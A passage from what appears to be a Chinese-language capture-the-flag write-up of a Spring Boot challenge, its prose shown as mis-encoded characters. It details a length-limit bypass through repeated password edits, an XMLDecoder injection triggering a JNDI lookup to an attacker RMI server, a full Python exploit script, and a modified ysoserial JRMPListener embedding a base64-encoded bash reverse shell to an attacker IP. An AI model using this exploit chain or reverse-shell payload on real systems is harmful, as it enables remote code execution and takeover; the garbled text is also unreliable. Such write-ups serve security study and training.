·å¯ä»¥ä¿è¯æˆ‘ä»¬å¯ä»¥å¯æ§åœ°è¿ç»­å†™å…¥payload</p><p>è€Œä¸”æˆ‘ä»¬æ³¨æ„å†™å…¥payloadä¹‹åè¿˜è¦ç¼©çŸ­é•¿åº¦æ»¡è¶³å…¶å°äºmaxLengthçš„è¦æ±‚</p></blockquote><p>ç°åœ¨ç»•è¿‡é•¿åº¦é™åˆ¶å†™ä»»æ„å†…å®¹çš„æ–¹æ³•æœ‰äº†ï¼Œåº”è¯¥æ€ä¹ˆå†™ï¼Œå†™ä»€ä¹ˆå‘¢</p><p>å› ä¸ºjava.è¢«ç¦æ‰äº†ï¼Œç›´æ¥å†™æ¶æ„ä»£ç çš„æ–¹æ³•è¡Œä¸é€šï¼Œwpç›´æ¥æ‰“jndiæ¥è§¦å‘Jacksonçš„é“¾å­ï¼Œspringbootæ˜¯è‡ªå¸¦Jacksonä¾èµ–</p><p>æˆ‘ä»¬è¦å†™å…¥çš„payloadå½¢å¼æ˜¯è¿™æ ·çš„</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://ip:port/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>userFileçš„æ–‡ä»¶é•¿è¿™æ ·</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åé¢˜ç›®ç»™äº†æˆ‘ä»¬&lt;!â€“è¿™æ ·ä¸€ä¸ªæç¤ºï¼Œæ„æ€è®©æˆ‘ä»¬åˆ©ç”¨htmlçš„æ³¨é‡Šï¼Œä¹Ÿå°±æ˜¯å†™å…¥è‡ªå·±çš„payloadå°†å…¶ä»–éƒ¨åˆ†æ³¨é‡Šæ‰ï¼Œä½¿è‡ªå·±çš„å†™å…¥çš„xmlç”Ÿæ•ˆ</p><p>é‚£å®Œæ•´çš„å†™æ³•æ€è·¯å°±æ˜¯åˆ©ç”¨JSESSIONä¿ç•™çš„æ€§è´¨ï¼Œæˆ‘ä»¬å»é‡å¤æ³¨å†Œåˆ é™¤åŒä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åæ¯æ¬¡æ³¨å†Œè¿›å»éƒ½æ˜¯æˆ‘ä»¬æƒ³è¦çš„oldPasswordå¯¹åº”æˆ‘ä»¬è¦æ›¿æ¢çš„xmlå…³é”®å­—ï¼Œå½“JSESSIONæœé›†å¤Ÿäº†ä¹‹åå°±å¯ä»¥å»æ”¹è¯¥ç”¨æˆ·çš„xmläº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.å°†javaæ›¿æ¢æˆ!--æ¥æ³¨é‡Šæ‰ä¸­é—´çš„å†…å®¹<br>2.æ³¨å†Œè·å–å„ä¸ªæ ‡ç­¾çš„JSESSION<br>3.æ³¨å†Œä¸€ä¸ªpasswordä¸ºç‰¹å®šæ ‡è¯†ç¬¦ç”¨äºæ›¿æ¢çš„ï¼Œæ¯”å¦‚wpå°±ç”¨_____æ¥ä½œä¸ºæ ‡è¯†<br>4.å¯¹å„éƒ¨åˆ†è¿›è¡Œæ›¿æ¢<br></code></pre></td></tr></table></figure><p>wpçš„payloadå½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®šä¹‰RMIServeråœ°å€</span><br>rmiserver = <span class="hljs-string">&quot;test&quot;</span><br><br><span class="hljs-comment"># æ„é€ æ¶æ„Javaåºåˆ—åŒ–payloadï¼Œç”¨äºè§¦å‘æ¼æ´</span><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span> + rmiserver + <span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br><br><span class="hljs-comment"># åˆå§‹åŒ–åˆ—è¡¨ï¼Œç”¨äºå­˜å‚¨åˆ†å—åçš„payload</span><br>list1 = []<br><br><span class="hljs-comment"># éå†payloadï¼Œæ¯5ä¸ªå­—ç¬¦è¿›è¡Œåˆ†å—ï¼Œå¹¶å¯¹æœ€åä¸€å—è¿›è¡Œç‰¹æ®Šå¤„ç†</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload1), <span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># å¦‚æœå‰©ä½™å­—ç¬¦å¤§äºç­‰äº5ä¸ªï¼Œåˆ™æ­£å¸¸åˆ†å—å¹¶å¡«å……ä¸‹åˆ’çº¿</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i + <span class="hljs-number">5</span>:] + <span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># å¦‚æœå‰©ä½™å­—ç¬¦ä¸è¶³5ä¸ªï¼Œåˆ™ç›´æ¥æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œå¹¶ç»“æŸå¾ªç¯</span><br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># æ‰“å°åˆæ­¥å¤„ç†åçš„åˆ—è¡¨</span><br><span class="hljs-built_in">print</span>(list1)<br><br><span class="hljs-comment"># å¦‚æœåˆ—è¡¨ä¸­æœ€åä¸€ä¸ªå…ƒç´ é•¿åº¦å°äº3ï¼Œåˆ™è¿›è¡Œç‰¹æ®Šå¤„ç†ä»¥æ„é€ ç‰¹å®šçš„è¾“å‡ºæ ¼å¼</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    <span class="hljs-comment"># å°†å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ çš„åä¸‰ä¸ªå­—ç¬¦ä¸æœ€åä¸€ä¸ªå…ƒç´ åˆå¹¶ï¼Œä»¥ä¿æŒä¿¡æ¯çš„è¿ç»­æ€§</span><br>    list1[-<span class="hljs-number">1</span>] = list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:] + list1[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># ä¿®æ­£å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä¿ç•™å…¶å¤§éƒ¨åˆ†å†…å®¹å¹¶å»é™¤æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œä¸ºå…¶åç»­ä¸æ–°çš„æœ€åä¸€ä¸ªå…ƒç´ åˆå¹¶åšå‡†å¤‡</span><br>    list1[-<span class="hljs-number">2</span>] = list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><br><span class="hljs-comment"># æ‰“å°æœ€ç»ˆå¤„ç†åçš„åˆ—è¡¨</span><br><span class="hljs-built_in">print</span>(list1)<br></code></pre></td></tr></table></figure><p>expå°±ç›´æ¥ç”¨wpçš„</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>targeturl = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-comment">#é¶æœºåœ°å€</span><br><br>rmiserver = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-comment">#rmiæœåŠ¡å™¨åœ°å€</span><br><br>sessions = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/register&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span> : <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register fail: <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getsession</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">in</span> res.text.lower() :<br>        session=res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;session for <span class="hljs-subst">&#123;passwd&#125;</span> : <span class="hljs-subst">&#123;session&#125;</span>&quot;</span>)<br>        headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">f&quot;JSESSIONID=<span class="hljs-subst">&#123;session&#125;</span>&quot;</span>&#125;<br>        sessions[passwd] = headers<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;login fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">editpass</span>(<span class="hljs-params">oldpass,newpass</span>):<br>    data=&#123;<span class="hljs-string">&quot;newPass&quot;</span>:newpass&#125;<br>    headers = sessions[oldpass]<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/editPass&quot;</span>,data=data,headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;change <span class="hljs-subst">&#123;oldpass&#125;</span> to <span class="hljs-subst">&#123;newpass&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;edit fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deluser</span>(<span class="hljs-params">passwd</span>):<br>    res = requests.get(targeturl+<span class="hljs-string">&quot;/del&quot;</span>,headers=sessions[passwd])<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;delete <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addsession</span>(<span class="hljs-params">passwd</span>):<br>    register(passwd)<br>    getsession(passwd)<br>    deluser(passwd)<br><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span>+rmiserver+<span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br>list1 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),<span class="hljs-number">5</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i+<span class="hljs-number">5</span>:]+<span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    list1[-<span class="hljs-number">1</span>]=list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:]+list1[-<span class="hljs-number">1</span>]<br>    list1[-<span class="hljs-number">2</span>]=list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(list1)<br><br><br>list2=[]<br>payload2=<span class="hljs-string">&quot;11111 class=\&quot;org.example.auth.User\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload2),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload2) - i &gt;= <span class="hljs-number">10</span>:<br>        list2.append(payload2[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list2.append(payload2[i:<span class="hljs-built_in">len</span>(payload2)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list2)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    addsession(s)<br><br>list3=[]<br>payload3=<span class="hljs-string">&quot;void property=\&quot;username\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload3),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload3) - i &gt;= <span class="hljs-number">10</span>:<br>        list3.append(payload3[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list3.append(payload3[i:<span class="hljs-built_in">len</span>(payload3)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list3)<br><br><br>list4=[]<br>payload4=<span class="hljs-string">&quot;void property=\&quot;password\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload4),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload4) - i &gt;= <span class="hljs-number">10</span>:<br>        list4.append(payload4[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list4.append(payload4[i:<span class="hljs-built_in">len</span>(payload4)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list4)<br><br><br><br>addsession(<span class="hljs-string">&quot;_____&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;____&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    addsession(s)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    addsession(s)<br><br>addsession(<span class="hljs-string">&quot;string&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;object&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/void&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;    &quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;1111111111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/11111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;java&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;11111&quot;</span>)<br><br>register(<span class="hljs-string">&quot;haha&quot;</span>)<br>getsession(<span class="hljs-string">&quot;haha&quot;</span>)<br>editpass(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;!--&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/11111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;    &quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/void&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;haha&quot;</span>,list1[<span class="hljs-number">0</span>])<br><br>editpass(<span class="hljs-string">&quot;11111&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-comment"># Now it&#x27;s the shortest (237)</span><br><br><span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> list1[<span class="hljs-number">1</span>::]:<br>    editpass(<span class="hljs-string">&quot;_____&quot;</span>,payload)<br><br>editpass(<span class="hljs-string">&quot;____&quot;</span>,<span class="hljs-string">&quot;&lt;!--&quot;</span>)<br><br>requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>å°†JRMPListenerä¿®æ”¹ä¸€ä¸‹ï¼Œæˆ‘çš„ä¿®æ”¹æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.exploit;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><span class="hljs-keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generic JRMP listener</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="hljs-comment"> * client connecting to it and making a call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> mbechler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<br>    <span class="hljs-string">&quot;restriction&quot;</span><br>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> Object payloadObject;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> URL classpathUrl;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> NumberFormatException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = payloadObject;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, String className, URL classpathUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = makeDummyObject(className);<br>        <span class="hljs-built_in">this</span>.classpathUrl = classpathUrl;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span> <span class="hljs-params">( <span class="hljs-type">int</span> i )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.hadConnection ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            System.err.println(<span class="hljs-string">&quot;Waiting for connection&quot;</span>);<br>            <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>                <span class="hljs-built_in">this</span>.waitLock.wait(i);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IOException e ) &#123;&#125;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//expéƒ¨åˆ†</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        objo.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">obji</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        obji.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[][] generateEvilBytes() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL2lwLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        <span class="hljs-comment">// ä¿®æ”¹ä¸ºè‡ªå·±çš„ip port</span><br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[][] evilbyte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;;<br><br>        <span class="hljs-keyword">return</span> evilbyte;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span 